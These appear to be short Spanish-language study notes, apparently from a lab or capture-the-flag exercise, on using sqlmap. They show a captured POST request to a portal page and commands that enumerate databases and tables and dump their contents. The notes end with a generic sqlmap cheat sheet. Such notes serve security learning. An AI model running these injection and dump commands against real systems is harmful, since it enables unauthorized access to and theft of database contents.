herramienta que automariza inyecciones sql

uso: interceptamos solicitud desde burpsuite y guardamos en un archivo el request completo
- (todo esto guardado en un archivo)
POST /portal.php HTTP/1.1
Host: 10.201.77.223
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://10.201.77.223
Connection: keep-alive
Referer: http://10.201.77.223/portal.php
Cookie: PHPSESSID=87a71nfd7qufq4dofo4gu39k85
Upgrade-Insecure-Requests: 1
Priority: u=0, i

searchitem=busqueda

- scan basico
sqlmap -r archivo 

- scan sabiendo el motor de bd
sqlmap -r archivo --dbms=mysql --dump


enumera bd:
sqlmap -r request.req --batch --dbs

enumera tablas:
sqlmap -r request.req --batch -D expose --tables

dumpea contenido de tablas expuestas
sqlmap -r request.req --batch -D expose --tables --dump


-----
#### Inyección SQL automática

```
sqlmap -u <url>
sqlmap -u <url> -p <parámetro>
sqlmap -u <url> --tables
sqlmap -u <url> -D <nombre de la BBDD> -T <Nombre de la tabla> --dump 
```